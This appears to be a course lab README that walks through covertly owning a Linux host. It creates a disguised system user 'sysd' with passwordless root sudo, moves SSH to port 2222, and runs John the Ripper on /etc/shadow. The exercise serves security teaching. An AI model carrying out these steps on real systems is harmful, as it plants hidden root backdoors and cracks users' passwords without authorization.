# -Advanced-Bash-Owning-the-System
This exercise involves setting up a secret user named 'sysd' with specific privileges and configurations in a Linux environment. The goal is to demonstrate advanced Bash skills related to user management, SSH configuration, Sudo access, and password cracking.

Step-by-Step Instructions:

Step 1: Shadow People

Create the secret user named 'sysd' without a home folder:
sudo useradd sysd --no-create-home

Set a password for the 'sysd' user:
sudo passwd sysd
(Enter and confirm the desired password)

Assign a system UID < 1000 to the 'sysd' user:
sudo usermod -u <UID> sysd
Replace <UID> with the desired UID number.

Assign the same GID to the 'sysd' user:
sudo usermod -g <GID> sysd
Replace <GID> with the desired GID number.

Grant full sudo access to 'sysd' without password:
Edit the sudoers file to allow 'sysd' to execute commands as root without a password prompt.
sudo visudo

Add the following line to the file:
sysd ALL=(ALL) NOPASSWD: ALL
Test sudo access:
Verify that sudo access works for 'sysd' without a password.
sudo ls /root

Step 2: Smooth Sailing

Edit the sshd_config file:
Open the sshd configuration file using nano (or preferred text editor).
sudo nano /etc/ssh/sshd_config
(Make necessary changes and save the file)

Step 3: Testing Your Configuration Update
Restart the SSH service:
Restart the SSH service to apply the configuration changes.
sudo service ssh restart
Exit the root account:

If currently in a root session, exit back to the 'sysd' user.
exit

SSH to the target machine using the 'sysd' account and port 2222:
Connect to the target machine using SSH and specify port 2222.

ssh -p 2222 sysd@192.168.6.105
Switch to the root user using sudo:
Gain root access on the target machine from the 'sysd' account.
sudo -i

Step 4: Crack All the Passwords
SSH back to the system using the 'sysd' account and port 2222:
Reconnect to the system using SSH with the 'sysd' account.
ssh -p 2222 sysd@192.168.6.105

Escalate privileges to root and use John to crack the /etc/shadow file:
Gain root privileges on the target system and use John the Ripper to crack passwords.
sudo john /etc/shadow

(Proceed with password cracking as needed)
Ensure to replace placeholders like <UID> and <GID> with appropriate values as per your setup. This exercise explores advanced Bash commands for user management, privilege escalation, SSH configuration, and password security testing.
